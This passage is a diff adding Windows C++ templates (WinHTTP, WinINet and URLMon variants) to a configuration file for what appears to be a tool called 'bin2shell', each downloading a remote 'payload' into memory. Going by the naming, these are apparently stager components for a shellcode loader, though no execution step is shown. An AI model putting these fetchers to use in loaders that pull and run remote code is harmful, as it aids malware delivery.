+  cpp_fetch_bytes: |
+    static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
+        auto utf8_to_wide = [](const std::string& s) -> std::wstring {
+            if (s.empty()) return {};
+            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
+            if (n <= 0) throw std::runtime_error("MultiByteToWideChar failed");
+            std::wstring out(static_cast<size_t>(n - 1), L'\0');
+            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, out.data(), n);
+            return out;
+        };
+        struct HInternet {
+            HINTERNET h;
+            HInternet(HINTERNET h_ = nullptr) : h(h_) {}
+            ~HInternet() { if (h) WinHttpCloseHandle(h); }
+            HInternet(const HInternet&) = delete;
+            HInternet& operator=(const HInternet&) = delete;
+        };
+        std::wstring wide = utf8_to_wide(url);
+        URL_COMPONENTSW uc{}; uc.dwStructSize = sizeof(uc);
+        uc.dwHostNameLength = (DWORD)-1; uc.dwUrlPathLength = (DWORD)-1;
+        if (!WinHttpCrackUrl(wide.c_str(), 0, 0, &uc))
+            throw std::runtime_error("WinHttpCrackUrl failed");
+        std::wstring host(uc.lpszHostName, uc.dwHostNameLength);
+        std::wstring path(uc.lpszUrlPath, uc.dwUrlPathLength);
+        if (path.empty()) path = L"/";
+        DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+        HInternet ses(WinHttpOpen(L"bin2shell/1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
+        if (!ses.h) throw std::runtime_error("WinHttpOpen failed");
+        HInternet con(WinHttpConnect(ses.h, host.c_str(), uc.nPort, 0));
+        if (!con.h) throw std::runtime_error("WinHttpConnect failed");
+        HInternet req(WinHttpOpenRequest(con.h, L"GET", path.c_str(), nullptr,
+                      WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
+        if (!req.h) throw std::runtime_error("WinHttpOpenRequest failed");
+        if (!WinHttpSendRequest(req.h, L"Connection: close\r\n", -1L,
+                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
+            throw std::runtime_error("WinHttpSendRequest failed");
+        if (!WinHttpReceiveResponse(req.h, nullptr))
+            throw std::runtime_error("WinHttpReceiveResponse failed");
+        DWORD sc = 0, ss = sizeof(sc);
+        WinHttpQueryHeaders(req.h, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                      WINHTTP_HEADER_NAME_BY_INDEX, &sc, &ss, WINHTTP_NO_HEADER_INDEX);
+        if (sc >= 400) throw std::runtime_error("HTTP error " + std::to_string(sc));
+        std::vector<unsigned char> body;
+        for (;;) {
+            DWORD avail = 0;
+            if (!WinHttpQueryDataAvailable(req.h, &avail)) break;
+            if (!avail) break;
+            size_t off = body.size(); body.resize(off + avail);
+            DWORD rd = 0;
+            if (!WinHttpReadData(req.h, body.data() + off, avail, &rd)) break;
+            body.resize(off + rd);
+            if (!rd) break;
+        }
+        return body;
+    }
+  cpp_fetch_text: |
+    static std::string bin2shell_fetch_payload_text(const std::string& url) {
+        auto b = bin2shell_fetch_payload_from_url(url);
+        return std::string(b.begin(), b.end());
+    }
+- index: 1
+  name: wininet
+  desc: Windows WinINet API — simpler HTTP client with proxy auto-detection, Internet Explorer heritage
+  cpp_includes: |
+    #include <stdexcept>
+    #include <string>
+    #include <vector>
+    #include <windows.h>
+    #include <wininet.h>
+    #pragma comment(lib, "wininet.lib")
+  cpp_fetch_bytes: |
+    static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
+        struct HInternet {
+            HINTERNET h;
+            HInternet(HINTERNET h_ = nullptr) : h(h_) {}
+            ~HInternet() { if (h) InternetCloseHandle(h); }
+            HInternet(const HInternet&) = delete;
+            HInternet& operator=(const HInternet&) = delete;
+        };
+        HInternet inet(InternetOpenA("bin2shell/1", INTERNET_OPEN_TYPE_PRECONFIG,
+                       nullptr, nullptr, 0));
+        if (!inet.h) throw std::runtime_error("InternetOpen failed");
+        HInternet conn(InternetOpenUrlA(inet.h, url.c_str(), nullptr, 0,
+                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0));
+        if (!conn.h) throw std::runtime_error("InternetOpenUrl failed");
+        std::vector<unsigned char> body;
+        char buf[4096];
+        DWORD rd = 0;
+        while (InternetReadFile(conn.h, buf, sizeof(buf), &rd) && rd > 0) {
+            body.insert(body.end(), buf, buf + rd);
+            rd = 0;
+        }
+        return body;
+    }
+  cpp_fetch_text: |
+    static std::string bin2shell_fetch_payload_text(const std::string& url) {
+        auto b = bin2shell_fetch_payload_from_url(url);
+        return std::string(b.begin(), b.end());
+    }
+- index: 2
+  name: urlmon
+  desc: Windows URLMoniker IStream API — minimal-code URL download via COM, block until complete
+  cpp_includes: |
+    #include <stdexcept>
+    #include <string>
+    #include <vector>
+    #include <windows.h>
+    #include <urlmon.h>
+    #pragma comment(lib, "urlmon.lib")
+  cpp_fetch_bytes: |
+    static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
+        IStream* pstm = nullptr;
+        HRESULT hr = URLOpenBlockingStreamA(nullptr, url.c_str(), &pstm, 0, nullptr);
+        if (FAILED(hr) || !pstm)
+            throw std::runtime_error("URLOpenBlockingStream failed");
+        std::vector<unsigned char> body;
+        char buf[4096];
+        ULONG rd = 0;
+        for (;;) {
+            HRESULT rhr = pstm->Read(buf, sizeof(buf), &rd);
+            if (rd > 0) body.insert(body.end(), buf, buf + rd);
+            if (rhr != S_OK) break;
+            rd = 0;
+        }
+        pstm->Release();
+        return body;
+    }
+  cpp_fetch_text: |
+    static std::string bin2shell_fetch_payload_text(const std::string& url) {
+        auto b = bin2shell_fetch_payload_from_url(url);
+        return std::string(b.begin(), b.end());
+    }
